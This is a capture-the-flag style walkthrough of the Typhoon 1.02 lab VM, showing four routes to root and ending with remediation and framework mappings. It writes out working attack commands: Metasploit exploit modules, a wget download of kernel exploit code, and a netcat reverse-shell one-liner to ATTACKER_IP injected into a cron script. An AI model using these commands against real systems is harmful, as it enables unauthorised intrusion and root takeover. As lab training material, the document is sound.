# Typhoon: 1.02 — When Every Port Is an Open Door

Alright guys!! Typhoon 1.02 is the "Swiss Army knife" of VulnHub boot2root machines. Seriously, four distinct exploitation paths to root: MongoDB admin with no auth, Tomcat Manager with default creds, Drupalgeddon2, and Lotus CMS RCE. Pick your vector, any vector. Then combine it with a world-writable root cron script or CVE-2015-1328 (overlayfs LPE) to land uid=0. The machine is a textbook example of what happens when a server runs every service imaginable without hardening any of them. Genuinely wild attack surface. Respect to Prakhar Prasad for the classic. (☞ﾟヮﾟ)☞

| Field | Value |
|---|---|
| **Level** | Medium |
| **Target VM** | Typhoon: 1.02 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/typhoon-102,267/ |
| **Techniques** | Nmap multi-service enumeration, MongoDB unauthenticated admin interface, credential extraction from NoSQL, SSH login, Ubuntu 14.04 overlayfs LPE (CVE-2015-1328), Apache Tomcat Manager file upload (default creds), Metasploit multi/http/tomcat_mgr_upload, world-writable root cron script, Drupalgeddon2 (CVE-2018-7600), Lotus CMS PHP execution |
| **CVEs** | CVE-2015-1328 (Ubuntu 14.04 overlayfs privilege escalation, EDB-37292), CVE-2018-7600 (Drupalgeddon2 remote code execution), CVE-2007-5024 (Tomcat Manager WAR upload), CWE-284 (MongoDB unauthenticated admin interface) |
| **APT Groups** | APT41: combines web application exploitation (Tomcat, Drupal) with local kernel LPE for reliable root escalation in enterprise intrusions; Lazarus Group: exploits exposed admin interfaces (MongoDB, Tomcat) as primary initial access technique; FIN7: leverages default credentials on management interfaces as first-stage access in targeted attacks |

---

## Attack Summary

```
nmap → 16+ services: FTP(21), SSH(22), SMTP(25), DNS(53), HTTP(80),
        POP3(110), rpcbind(111), SMB(139/445), IMAP(143), CUPS(631),
        IMAPS(993), POP3S(995), NFS(2049), MySQL(3306), PostgreSQL(5432),
        Tomcat(8080)

Path 1 (Primary):
  → robots.txt → /mongoadmin/
  → MongoDB: no auth → credentials DB → typhoon:789456123
  → SSH typhoon:789456123
  → uname → Ubuntu 14.04 → CVE-2015-1328 (EDB-37292)
  → gcc 37292.c -o rootshell → ./rootshell → uid=0(root)

Path 2:
  → Tomcat :8080 → Manager (tomcat:tomcat)
  → Metasploit tomcat_mgr_upload → Meterpreter
  → /tab/script.sh (world-writable, root-owned) → reverse shell → root

Path 3:
  → http://target/drupal/ → CVE-2018-7600 (Drupalgeddon2) → www-data
  → CVE-2015-1328 → root

Path 4:
  → http://target/cms/ → Lotus CMS PHP exec → shell
  → CVE-2015-1328 → root

→ cat /root/root-flag
```

---

## Methodology

1. Full port scan to identify the broad attack surface
2. Web enumeration: robots.txt, directory brute-force, service fingerprinting
3. **Path 1 (Primary):** MongoDB credential extraction → SSH → kernel LPE
4. **Path 2:** Tomcat Manager upload → Meterpreter → world-writable root script
5. **Path 3:** Drupalgeddon2 RCE → kernel LPE
6. **Path 4:** Lotus CMS PHP execution → kernel LPE
7. Root flag capture

---

## Step 1 — Host Discovery and Full Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.101

nmap -sV -sC -A 192.168.1.101
```

| Port | Service |
|---|---|
| 21 | FTP |
| 22 | SSH |
| 25 | SMTP |
| 53 | DNS |
| 80 | HTTP (Apache) |
| 110 | POP3 |
| 111 | rpcbind |
| 139/445 | NetBIOS/SMB |
| 143 | IMAP |
| 631 | IPP (CUPS) |
| 993 | IMAPS |
| 995 | POP3S |
| 2049 | NFS |
| 3306 | MySQL |
| 5432 | PostgreSQL |
| 8080 | Tomcat/Coyote JSP |

Sixteen services. Each is a potential attack vector. The breadth of exposure is the defining characteristic of this machine.

**Real-world note:** This attack surface resembles what a penetration tester would find on an unpatched Ubuntu server that was provisioned with a "kitchen sink" package set and never reviewed. Multiple CISA advisories specifically warn that internet-facing systems with more than 5-7 open services dramatically expand the attack surface and should be considered critically misconfigured.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

```bash
curl -s http://192.168.1.101/robots.txt
# → /mongoadmin/

dirb http://192.168.1.101
# → /drupal/
# → /cms/
# → /mongoadmin/
```

Port 8080: browse to `http://192.168.1.101:8080`. Apache Tomcat Manager is accessible. Test default credentials immediately:

```bash
curl -u tomcat:tomcat http://192.168.1.101:8080/manager/html
# → HTTP 200 — Manager app accessible with default credentials
```

`tomcat:tomcat` works. This is a critical finding.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1078.001 — Valid Accounts: Default Accounts

---

## Path 1 (Primary): MongoDB → SSH → CVE-2015-1328

### Step 3a — MongoDB Credential Extraction

Browse to `http://192.168.1.101/mongoadmin/`. The phpMoAdmin or similar interface requires no authentication. Set the active database to `credentials` (listed at ~84MB):

The collection shows stored credential documents. Look for user `typhoon`:

```
{ "username": "typhoon", "password": "789456123" }
```

**Credentials:** `typhoon` / `789456123`

**Real-world note:** MongoDB's default configuration until version 2.6 (2014) was to listen on all interfaces with no authentication. Thousands of production MongoDB instances remained publicly exposed with default configurations for years after. APT groups including APT41 and Lazarus Group performed mass scanning for exposed MongoDB instances as a primary initial access technique from 2016-2019.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1552.001 — Unsecured Credentials: Credentials in Files

---

### Step 4a — SSH Login as typhoon

```bash
ssh typhoon@192.168.1.101
# Password: 789456123

typhoon@typhoon-pc:~$ id
# uid=1000(typhoon) gid=1000(typhoon) groups=1000(typhoon)
```

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH; T1078 — Valid Accounts

---

### Step 5a — Kernel Exploit: CVE-2015-1328 (EDB-37292)

Check OS version:

```bash
uname -a
# Linux typhoon-pc 3.13.0-32-generic #57~precise1-Ubuntu SMP ...
lsb_release -a
# Ubuntu 14.04
```

Ubuntu 14.04 kernel 3.13.0-32 is vulnerable to overlayfs local privilege escalation (CVE-2015-1328). Exploit is EDB-37292:

```bash
searchsploit ubuntu 14.04 local
# → linux/local/37292.c  Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04)
```

Transfer and compile on target:

```bash
# Attacker machine:
cp /usr/share/exploitdb/exploits/linux/local/37292.c /tmp/
cd /tmp
python3 -m http.server 80

# Target machine:
cd /tmp
wget http://ATTACKER_IP/37292.c
gcc 37292.c -o rootshell
chmod +x rootshell
./rootshell
```

```
id
# uid=0(root) gid=0(root) groups=0(root)
```

**Real-world note:** CVE-2015-1328 affects Ubuntu 14.04 LTS which reached End-of-Life in April 2019. Long-unpatched kernels are a persistent reality in enterprise environments where update schedules are not enforced. APT41 specifically uses kernel LPE exploits as a second-stage capability after initial web application compromise.

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

### Step 6a — Root Flag

```bash
cat /root/root-flag
```

---

## Path 2: Tomcat Manager Upload → Meterpreter → World-Writable Root Script

### Step 3b — Metasploit Tomcat WAR Upload

```bash
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set rhost 192.168.1.101
set rport 8080
set httpusername tomcat
set httppassword tomcat
set lhost ATTACKER_IP
exploit
```

Meterpreter session opens as `tomcat7` or `www-data`. Drop to shell:

```bash
shell
id
# uid=108(tomcat7) gid=116(tomcat7)
```

### Step 4b — World-Writable Root Script

Enumerate writable files:

```bash
find / -writable -type f 2>/dev/null | grep -v proc
# → /tab/script.sh

ls -la /tab/script.sh
# -rwxrwxrwx 1 root root ... /tab/script.sh
```

The file is owned by root and world-writable. It is likely executed by a root cron job. Overwrite it:

```bash
# Generate payload
msfvenom -p cmd/unix/reverse_netcat lhost=ATTACKER_IP lport=1234 R
# → mkfifo /tmp/X; nc ATTACKER_IP 1234 0</tmp/X | /bin/sh >/tmp/X 2>&1; rm /tmp/X

# On attacker: start listener
nc -lvnp 1234

# On target: overwrite script
echo "mkfifo /tmp/vvwjo; nc ATTACKER_IP 1234 0</tmp/vvwjo | /bin/sh >/tmp/vvwjo 2>&1; rm /tmp/vvwjo" > /tab/script.sh
```

When the cron fires, root shell arrives at the listener.

**MITRE ATT&CK:** T1053.003 — Scheduled Task: Cron; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Path 3: Drupalgeddon2 (CVE-2018-7600)

```bash
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set rhost 192.168.1.101
set targeturi /drupal
set lhost ATTACKER_IP
exploit
```

Meterpreter session as `www-data`. Escalate to root using Path 1's kernel exploit method.

**Real-world note:** CVE-2018-7600 (Drupalgeddon2) is in the CISA Known Exploited Vulnerabilities catalog. It affects Drupal 6.x, 7.x, and 8.x. Exploitation is trivial and automated. Multiple APT groups used Drupalgeddon2 as an initial access vector in 2018 campaigns.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application

---

## Path 4: Lotus CMS PHP Execution

```bash
msfconsole
use exploit/multi/http/lcms_php_exec
set rhost 192.168.1.101
set uri /cms/
set lhost ATTACKER_IP
exploit
```

Meterpreter session obtained. Escalate to root using the kernel exploit.

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Unix Shell

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Credential | `typhoon:789456123` | MongoDB /mongoadmin/ no-auth | SSH login |
| Credential | `tomcat:tomcat` | Tomcat Manager default creds | WAR upload |
| CVE | CVE-2015-1328 (EDB-37292) | Ubuntu 14.04 kernel | Local privilege escalation |
| CVE | CVE-2018-7600 (Drupalgeddon2) | /drupal/ | RCE as www-data |
| World-writable script | /tab/script.sh | Filesystem enumeration | Root shell via cron |
| Root flag | (root-flag contents) | /root/root-flag | Challenge completion |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | MongoDB admin exposed without authentication | Thousands of MongoDB instances were publicly exposed by default config; APT41 and Lazarus mass-scanned for these | Bind MongoDB to localhost; use authentication; remove web admin interfaces from production |
| 2 | Credentials stored in MongoDB in cleartext | NoSQL databases storing passwords in cleartext are a critical finding | Hash passwords with bcrypt/Argon2; never store cleartext credentials in any database |
| 3 | Tomcat Manager with default credentials | Default creds (tomcat:tomcat) are universally known and scanned for by automated tools | Change Tomcat credentials immediately post-deployment; remove Manager app if not needed |
| 4 | Ubuntu 14.04 EOL with unpatched kernel (CVE-2015-1328) | EOL OS with unpatched LPE is a consistent finding in enterprise assessments | Enforce OS update schedules; migrate off EOL systems; use automated patch management |
| 5 | World-writable root-owned cron script (/tab/script.sh) | Writable cron scripts allow any user to overwrite and execute arbitrary code as root | `chmod 700` all cron scripts; audit writable files weekly; use AIDE/tripwire |
| 6 | Drupalgeddon2 (CVE-2018-7600) on unpatched Drupal | In CISA KEV; mass-exploited by APT groups in 2018; trivial exploitation | Update Drupal core immediately; apply security patches within 48 hours of release |
| 7 | Breadth of exposed services (16+ ports) | Each exposed service is an independent attack surface; redundant services multiply risk | Disable all non-required services; firewall by default-deny; enforce least-functionality principle |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Initial Access | Initial Access | Valid Accounts: Default Accounts | T1078.001 |
| Credential Access | Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | Persistence | Scheduled Task: Cron | T1053.003 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Privilege Escalation | Privilege Escalation | Scheduled Task: Cron | T1053.003 |

---

## Remediation and Containment

### Technical Fixes

1. **Bind MongoDB to localhost**: `net.bindIp: 127.0.0.1` in mongod.conf; require authentication for all connections
2. **Remove phpMoAdmin or similar web admin tools** from production servers
3. **Change Tomcat Manager credentials**: update `tomcat-users.xml`; remove Manager app if unused
4. **Patch Ubuntu to a supported LTS release**: Ubuntu 14.04 reached EOL April 2019; CVE-2015-1328 requires OS upgrade
5. **Fix world-writable cron scripts**: `chmod 700 /tab/script.sh; chown root:root /tab/script.sh`
6. **Update Drupal core**: apply security advisories SA-CORE-2018-002; enable automatic security updates
7. **Remove or restrict Lotus CMS**: update to latest version or remove if unused
8. **Disable all non-required services**: FTP, SMTP, DNS, NFS, MySQL, PostgreSQL should be disabled or firewalled unless explicitly required

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all running services; classify each by necessity |
| Protect | Access Control | Bind MongoDB to localhost; change Tomcat defaults; disable anonymous FTP |
| Protect | Data Security | Hash passwords in MongoDB; no cleartext credentials in databases |
| Detect | Anomalies and Events | Alert on unauthenticated MongoDB access; monitor Tomcat manager activity |
| Respond | Response Planning | Rotate all compromised credentials; patch CVE-2015-1328 and CVE-2018-7600 |
| Recover | Recovery Planning | Rebuild compromised host; audit all service configurations |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Require authentication for MongoDB; remove Tomcat default credentials |
| AC-6 | Least Privilege | Remove Manager app if unused; restrict NFS/FTP access |
| CM-7 | Least Functionality | Disable all non-required services; bind services to localhost |
| SI-2 | Flaw Remediation | Patch CVE-2015-1328 and CVE-2018-7600; upgrade from Ubuntu 14.04 EOL |
| IA-2 | Identification and Authentication | Require auth for all admin interfaces including MongoDB |
| IA-5 | Authenticator Management | Change Tomcat/MongoDB defaults; enforce strong credentials |

### CISA KEV

Both CVE-2015-1328 and CVE-2018-7600 are referenced in CISA advisories. CVE-2018-7600 (Drupalgeddon2) is catalogued in the CISA Known Exploited Vulnerabilities catalog and requires immediate patching per BOD 22-01. MongoDB unauthenticated access maps to CISA guidelines on securing internet-facing infrastructure (AA21-008A).

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT and OT Asset Inventory | MIL3 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL3 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (MongoDB auth; Tomcat credential rotation; Drupal patching)
- **D3-OAM** — Operating System Administrative Management (patch CVE-2015-1328; OS upgrade from EOL)
- **D3-NI** — Network Isolation (disable non-required services; firewall default-deny)
- **D3-FA** — File Access Monitoring (monitor /tab/script.sh writes; alert on cron script modification)

---

## Final Thoughts

Typhoon 1.02 is the machine you show to a client when they ask "what does a real misconfigured server look like?" Every vulnerability on this machine is a real finding that appears in actual production assessments, from MongoDB with no auth to Tomcat default creds to EOL kernel LPE. The multiple attack paths teach an important lesson: when a server has this many exposed services, you do not need a zero-day. You need patience and a checklist. Every single one of these services handed over the machine independently.

The Path 1 MongoDB path is the most elegant: no exploitation, no tools, just a browser and a credential collection screen. The lesson is not lost. Poorly configured databases are consistently among the most impactful findings in external assessments. wild machine, goated for teaching breadth-first recon. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
